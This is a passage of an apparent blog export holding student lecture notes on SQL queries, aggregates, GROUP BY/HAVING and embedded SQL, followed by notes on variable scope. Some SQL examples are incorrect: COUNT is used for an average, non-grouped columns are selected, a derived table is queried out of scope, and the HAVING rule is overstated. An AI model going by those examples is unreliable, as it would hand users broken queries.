<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>Structured Query Language</title>
    <url>/myBlog/2023/03/10/2023/CSCI3170/2023-3-10-CSCI3170-SQL/</url>
    <content><![CDATA[<h2 id="Basic-Query"><a href="#Basic-Query" class="headerlink" title="Basic Query"></a>Basic Query</h2><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><ol>
<li><code>SELECT</code> clause<ul>
<li>specify the columns that you want to retrieve from a database table</li>
</ul>
</li>
</ol>
<ul>
<li><code>DISTINCT</code> keyword (optional)<ul>
<li>return only unique values from a specific column (i.e., it would eliminate the outputs)</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p><code>FROM</code> clause</p>
<ul>
<li>specify the table or tables from which you want to retrieve data</li>
</ul>
</li>
<li><p><code>WHERE</code>clause (optional)</p>
<ul>
<li>filter data based on a specific condition</li>
</ul>
</li>
</ol>
<ul>
<li><p>$$\Pi_{a_1, a_2, \cdots, a_n}( \space \sigma_P ( \space R_1 \times R_2 \times \cdots \times R_m))$$</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> a1, a2, ..., an    <span class="comment">-- target list</span></span><br><span class="line"><span class="keyword">FROM</span> R1, R2, ..., Rm    <span class="comment">-- relation list</span></span><br><span class="line"><span class="keyword">WHERE</span> P     <span class="comment">-- qualification</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Examples:</p>
<ol>
<li><p>Find the names of sailors who have reserved boat number 103</p>
 <img src="https://p.ipic.vip/26oc0w.png" width="500px" />
 
<ul>
<li>$$\Pi_{S.sname}( \space \sigma_{R.sid &#x3D; S.sid \space \land \space R.bid &#x3D; 103} ( S \times R))$$  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.sid <span class="operator">=</span> S.sid <span class="keyword">AND</span> R.bid <span class="operator">=</span> <span class="number">103</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Given following schema:</p>
 <img src="https://p.ipic.vip/e72rar.png" width="400px" />

<ol>
<li><p>Find the sids of sailors who have reserved a red boat</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Find the names of sailors who have reserved a red boat</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S, Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="operator">=</span> R.sid <span class="keyword">AND</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Find the colors of boats reserved by Lubber</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> B.color</span><br><span class="line"><span class="keyword">FROM</span> Sailors S, Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> S.sname <span class="operator">=</span> <span class="string">&#x27;Lubber&#x27;</span> <span class="keyword">AND</span> S.sid <span class="operator">=</span> R.sid <span class="keyword">AND</span> B.bid <span class="operator">=</span> R.bid</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
</ul>
<h3 id="Expressions-amp-Strings"><a href="#Expressions-amp-Strings" class="headerlink" title="Expressions &amp; Strings"></a>Expressions &amp; Strings</h3><ol>
<li><p><code>AS</code> and <code>=</code> (name field)</p>
<ul>
<li>rename columns or tables in the query result  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.age, age1 <span class="operator">=</span> S.age <span class="operator">+</span> <span class="number">5</span>, S.age <span class="operator">*</span> <span class="number">2</span> <span class="keyword">AS</span> age2</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>LIKE</code></p>
<ul>
<li>is used for string matching</li>
<li><code>_</code> means any one character (must have one character)</li>
<li><code>%</code> means 0 or more arbitrary characters  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WHERE</span> S.sname <span class="keyword">LIKE</span> <span class="string">&#x27;B_%B&#x27;</span>   <span class="comment">-- BAB, BBBBBBB are accepted, BB is not accepted</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Set-Manipulation"><a href="#Set-Manipulation" class="headerlink" title="Set Manipulation"></a>Set Manipulation</h2><h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><ul>
<li>combine the results of two <code>SELECT</code> statements into a single result set (<font color="3A75EA">eliminates duplicates</font>)<ul>
<li><p>E.g., Find the sids of sailors who have reserved a red boat <font color="3A75EA">or</font> a green boat</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- SELECT R.sid</span></span><br><span class="line"><span class="comment">-- FROM Boats B, Reserves R</span></span><br><span class="line"><span class="comment">-- WHERE B.bid = R.bid AND (B.color = &#x27;red&#x27; OR B.color = &#x27;green&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Intersection"><a href="#Intersection" class="headerlink" title="Intersection"></a>Intersection</h3><ul>
<li>retrieve only the common records returned by two <code>SELECT</code> statements<ul>
<li>E.g., Find the sids of sailors who have reserved a red boat <font color="3A75EA">and</font> a green boat  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- SELECT R.sid</span></span><br><span class="line"><span class="comment">-- FROM Boats B, Reserves R</span></span><br><span class="line"><span class="comment">-- WHERE B.bid = R.bid AND (B.color = &#x27;red&#x27; AND B.color = &#x27;green&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Except"><a href="#Except" class="headerlink" title="Except"></a>Except</h3><ul>
<li>retrieve all records from one <code>SELECT</code> statement that are not returned by a second <code>SELECT</code> statement<ul>
<li>E.g., Find the sids of sailors who have reserved a red boat <font color="3A75EA">but not</font> a green boat  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXCEPT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Nested-Structure"><a href="#Nested-Structure" class="headerlink" title="Nested Structure"></a>Nested Structure</h2><h3 id="Nested-Queries"><a href="#Nested-Queries" class="headerlink" title="Nested Queries"></a>Nested Queries</h3><ul>
<li>a query that has another query embedded within it, the embedded query is called as a subquery</li>
<li>the queries can have a deeply nested structures<ul>
<li>E.g., Find names of sailors who have reserved boat with bid 103  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="keyword">IN</span> (<span class="keyword">SELECT</span> R.sid</span><br><span class="line">                <span class="keyword">FROM</span> Reserves R</span><br><span class="line">                <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>The inner subquery is completely independent of the outer query</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Correlated-Nested-Queries"><a href="#Correlated-Nested-Queries" class="headerlink" title="Correlated Nested Queries"></a>Correlated Nested Queries</h3><ul>
<li>a type of nested query that uses data from the outer query in the subquery<ul>
<li>E.g., Find names of sailors who have reserved boat with bid 103  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">              <span class="keyword">FROM</span> Reserves R</span><br><span class="line">              <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span> <span class="keyword">AND</span> S.sid <span class="operator">=</span> R.sid)</span><br></pre></td></tr></table></figure>
<ul>
<li>The inner subquery depends on the row that being examined in the outer query</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Comparsion-Operators"><a href="#Comparsion-Operators" class="headerlink" title="Comparsion Operators"></a>Comparsion Operators</h2><h3 id="Arithmetic-Comparison-Operators"><a href="#Arithmetic-Comparison-Operators" class="headerlink" title="Arithmetic Comparison Operators"></a>Arithmetic Comparison Operators</h3><ol>
<li><p><code>=</code>: equality</p>
</li>
<li><p><code>!=</code> or <code>&lt;&gt;</code>: not equal to</p>
</li>
<li><p><code>&lt;</code>:less than</p>
</li>
<li><p><code>&gt;</code>: greater than</p>
</li>
<li><p><code>&lt;=</code>: less than or equal to</p>
</li>
<li><p><code>&gt;=</code>: greater than or equal to</p>
</li>
</ol>
<h3 id="Set-Comparsion-Operators"><a href="#Set-Comparsion-Operators" class="headerlink" title="Set Comparsion Operators"></a>Set Comparsion Operators</h3><ol>
<li><p><code>IN</code> Operator</p>
<ul>
<li>check whether a specified value matches any value in a list or a subquery</li>
<li>allows us to specify multiple values in a <code>WHERE</code> clause</li>
<li>negative operator: <code>NOT IN</code><ul>
<li>E.g., Find the names of boats which are red, blue or green  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> B.bname</span><br><span class="line"><span class="keyword">FROM</span> Boats B</span><br><span class="line"><span class="keyword">WHERE</span> B.color <span class="keyword">IN</span> (<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;green&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p><code>EXISTS</code></p>
<ul>
<li>check if a subquery returns any rows</li>
<li>negative operator: <code>NOT EXISTS</code><ul>
<li>E.g., Find names of sailors who have reserved boat with bid 103  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">                <span class="keyword">FROM</span> Reserves R</span><br><span class="line">                <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span> <span class="keyword">AND</span> S.sid <span class="operator">=</span> R.sid)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p><code>op ANY</code> or <code>op SOME</code></p>
<ul>
<li>check if the value being compared matches any of the values returned by the subquery<ul>
<li>E.g., Find sailors whose rating is greater than that of some sailor called Horatio:  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S1</span><br><span class="line"><span class="keyword">WHERE</span> S1.rating <span class="operator">&gt;</span> <span class="keyword">ANY</span> (<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">                       <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">                       <span class="keyword">WHERE</span> S2.name <span class="operator">=</span> <span class="string">&#x27;Horatio&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p><code>op ALL</code></p>
<ul>
<li>check if the value being compared matches all of the values returned by the subquery<ul>
<li>E.g., Find sailors whose rating is better than every sailor called Horatio  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S1</span><br><span class="line"><span class="keyword">WHERE</span> S1.rating <span class="operator">&gt;</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">                       <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">                       <span class="keyword">WHERE</span> S2.name <span class="operator">=</span> <span class="string">&#x27;Horatio&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>E.g., Find the sailors with the highest rating  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S1</span><br><span class="line"><span class="keyword">WHERE</span> S1.rating <span class="operator">&gt;=</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">                        <span class="keyword">FROM</span> Sailors S2)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h2><h2 id="Aggregate-Operations"><a href="#Aggregate-Operations" class="headerlink" title="Aggregate Operations"></a>Aggregate Operations</h2><h3 id="Five-Operations"><a href="#Five-Operations" class="headerlink" title="Five Operations"></a>Five Operations</h3><table>
<thead>
<tr>
<th align="center">Operations</th>
<th align="center">Syntax</th>
<th align="center">Descriptions</th>
</tr>
</thead>
<tbody><tr>
<td align="center">COUNT</td>
<td align="center"><code>COUNT([DISTINCT]A)</code></td>
<td align="center">The number of [unique] value in the A column</td>
</tr>
<tr>
<td align="center">SUM</td>
<td align="center"><code>SUM([DISTINCT]A)</code></td>
<td align="center">The sum of all [unique] values in the A column</td>
</tr>
<tr>
<td align="center">AVG</td>
<td align="center"><code>AVG([DISTINCT]A)</code></td>
<td align="center">The average of all [unique] values in the A column</td>
</tr>
<tr>
<td align="center">MAX</td>
<td align="center"><code>MAX(A)</code></td>
<td align="center">The maximum values in the A column</td>
</tr>
<tr>
<td align="center">MIN</td>
<td align="center"><code>MIN(A)</code></td>
<td align="center">The minimum values in the A column</td>
</tr>
</tbody></table>
<ul>
<li><p>Syntax for <code>COUNT</code>, <code>SUM</code> and <code>AVG</code>:</p>
<ul>
<li>E.g., Find the average age of all sailors with rating of 10  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(S.age)</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.rating <span class="operator">=</span> <span class="number">10</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Syntax for <code>MAX</code> and <code>MIN</code>:</p>
<ul>
<li><p>E.g., Find the name and age of the oldest sailor</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, S.age</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">MAX</span>(S2.age)</span><br><span class="line">                <span class="keyword">FROM</span> Sailors S2)</span><br></pre></td></tr></table></figure>
</li>
<li><p><font color="F54747">Noted: the following syntax is invalid</font></p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, <span class="built_in">MAX</span>(S.age)   <span class="comment">-- invalid</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Examples:</p>
<ol>
<li><p>Count the number of sailors</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> Sailors</span><br></pre></td></tr></table></figure>
</li>
<li><p>Find the names of sailors who are older than the oldest sailor with a rating of 10</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">&gt;</span> (<span class="keyword">SELECT</span> <span class="built_in">MAX</span>(S2.age)</span><br><span class="line">               <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">               <span class="keyword">WHERE</span> S2.rating <span class="operator">=</span> <span class="number">10</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h3 id="GROUP-BY-and-HAVING"><a href="#GROUP-BY-and-HAVING" class="headerlink" title="GROUP BY and HAVING"></a>GROUP BY and HAVING</h3><ul>
<li><p><code>GROUP BY</code> is used to group rows based on the values in one or more columns with aggregate functions</p>
</li>
<li><p><code>HAVING</code> is used to filter the groups based on some criteria</p>
<ul>
<li><font color="F54747">Noted: </font>only the columns that appear in <code>GROUP BY</code> clause can appear in the <code>HAVING</code> clause</li>
</ul>
  <img src="https://p.ipic.vip/1boi8k.png" width="300px" />
  
<ul>
<li><p>E.g., Find the average age of sailors for each rating level that has at least two sailors</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname, <span class="built_in">AVG</span>(S.age) <span class="keyword">AS</span> avgage</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.rating</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/aoksri.png" width="150px" />
</li>
<li><p>E.g., Find the average age of sailors who are <font color="F54747">at least 18 years old</font> for each rating level that has at least two sailors</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname, <span class="built_in">AVG</span>(S.age) <span class="keyword">AS</span> avgage</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">&gt;=</span> <span class="number">18</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.rating</span><br><span class="line"><span class="keyword">HAVING</span> <span class="number">2</span> <span class="operator">&lt;=</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)    <span class="comment">-- !!!</span></span><br><span class="line">             <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">             <span class="keyword">WHERE</span> S.rating <span class="operator">=</span> S2.rating)</span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/wnyr0a.png" width="150px" />
</li>
<li><p>E.g., Find the average age of sailors who are <font color="F54747">at least 18 years old</font> for each rating level that has at least <font color="F54747">such</font> two sailors</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname, <span class="built_in">AVG</span>(S.age) <span class="keyword">AS</span> avgage</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">&gt;=</span> <span class="number">18</span>   <span class="comment">-- ?</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.rating</span><br><span class="line"><span class="keyword">HAVING</span> <span class="number">2</span> <span class="operator">&lt;=</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line">             <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">             <span class="keyword">WHERE</span> S.rating <span class="operator">=</span> S2.rating <span class="keyword">AND</span> S.age <span class="operator">&gt;=</span> <span class="number">18</span>)   <span class="comment">-- !!!</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/igqoj0.png" width="150px" /></li>
</ul>
</li>
<li><p><font color="F54747"><strong>Noted:</strong> Aggregate operations cannot be nested!!!</font></p>
<ul>
<li>E.g., Find those ratings for which the average age is the minimum over all ratings</li>
<li>The following SQL is invalid:  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.rating</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(<span class="built_in">AVG</span>(S2.age))</span><br><span class="line">               <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">               <span class="keyword">GROUP</span> <span class="keyword">BY</span> S2.rating)</span><br></pre></td></tr></table></figure></li>
<li>Solution:  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Temp.rating, Temp.avgage</span><br><span class="line"><span class="keyword">FROM</span> (<span class="keyword">SELECT</span> S.rating, <span class="built_in">AVG</span>(S.age) <span class="keyword">AS</span> avgage</span><br><span class="line">      <span class="keyword">FROM</span> Sailors S</span><br><span class="line">      <span class="keyword">GROUP</span> <span class="keyword">BY</span> S.rating) <span class="keyword">AS</span> Temp</span><br><span class="line"><span class="keyword">WHERE</span> Temp.avgage <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(Temp.avgage)</span><br><span class="line">                     <span class="keyword">FROM</span> Temp)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1 id="Database-Application-Development"><a href="#Database-Application-Development" class="headerlink" title="Database Application Development"></a>Database Application Development</h1><h2 id="Embedded-SQL"><a href="#Embedded-SQL" class="headerlink" title="Embedded SQL"></a>Embedded SQL</h2><ul>
<li>the practice of embedding SQL statements directly into another programming language</li>
<li>Language constructs:<ul>
<li>Connect to a database: <code>EXEC SQL CONNECT</code></li>
<li>Declare variables: <code>EXEC SQL BEGIN (END) DECLARE SECTION</code>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- all variables should be declared between the two statements</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">BEGIN</span> <span class="keyword">DECLARE</span> SECTION</span><br><span class="line"><span class="type">char</span> c_sname[<span class="number">20</span>];   <span class="comment">-- CHARACTER(20)</span></span><br><span class="line">long c_sid;         <span class="comment">-- INTEGER</span></span><br><span class="line">short c_rating;     <span class="comment">-- SMALL INT</span></span><br><span class="line"><span class="type">float</span> c_age;        <span class="comment">-- REAL</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">END</span> <span class="keyword">DECLARE</span> SECTION</span><br></pre></td></tr></table></figure></li>
<li>Statements: <code>EXEC SQL Statement;</code>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">INSERT</span> <span class="keyword">INTO</span> Sailors <span class="keyword">VALUES</span></span><br><span class="line">            (:c_sname, :c_sid, :c_rating, :c_age);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<!-- 
<img src="" width="500px" />
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->


<!-- 
<img src="" width="500px" />
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>Scope</title>
    <url>/myBlog/2023/02/25/2023/CSCI3180/2023-2-25-CSCI3180-Scope/</url>
    <content><![CDATA[<h2 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h2><ul>
<li>variables and functions declared in a particular scope are visible and accessible only within that scope and its nested scopes, but not outside of it<ol>
<li><p>Local variables</p>
<ul>
<li>The variables defined within a particular function or block of code</li>
<li>The are only accessible within that function or block and its nested scopes</li>
</ul>
</li>
<li><p>Nonlocal variables</p>
<ul>
<li>The variables defined in a parent function</li>
<li>They are accessible within nested functions</li>
</ul>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> g;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="comment">// g is nonlocal (global)</span></span><br><span class="line">    <span class="comment">// a, b are local</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// g is nonlocal (global)</span></span><br><span class="line">    <span class="comment">// x is local</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// g is nonlocal (global)</span></span><br><span class="line">        <span class="comment">// x is nonlcoal</span></span><br><span class="line">        <span class="comment">// i, y are local</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h2 id="Static-Scope"><a href="#Static-Scope" class="headerlink" title="Static Scope"></a>Static Scope</h2><ul>
<li><p>It done <font color="3A75EA">before run time</font></p>
</li>
<li><p>It searches <font color="3A75EA">locally</font>, then proceeds to <font color="F54747">increasingly larger enclosing scopes</font> until the given variable name is found</p>
<ul>
<li><p>Static ancestors: the enclosing static scope that contain it</p>
</li>
<li><p>Static parent: the nearest static ancestors</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&quot;global&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    x = <span class="string">&quot;outer&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        x = <span class="string">&quot;inner&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(x) <span class="comment"># inner</span></span><br><span class="line"></span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(x) <span class="comment"># outer</span></span><br><span class="line"></span><br><span class="line">outer()</span><br><span class="line"><span class="built_in">print</span>(x) <span class="comment"># global</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><font color="F54747"><strong>Advantages</strong></font>:<ol>
<li>Easy to read and understand</li>
<li>Relatively fast</li>
<li>Static type checking is possible</li>
</ol>
</li>
<li><font color="F54747"><strong>Disadvantages</strong></font>:<ol>
<li>Too much access is possible</li>
<li>Inconvenience<ul>
<li>As the program evolves, the initial structure is destoryed and local variables often become global, even subprograms also toward become global rather than nested</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Blocks"><a href="#Blocks" class="headerlink" title="Blocks"></a>Blocks</h3><ul>
<li><p>A method of creating static scopes inside a program unit (<code>C++</code>, <code>Java</code> cannot define a function inside a function)</p>
</li>
<li><p><font color="3A75EA">Compound statement</font> is a statement sequence that groups more statements into a single statement (in a brace<code>&#123;&#125;</code>)</p>
<ul>
<li><p>each compound statement have declarations which defined a new scope</p>
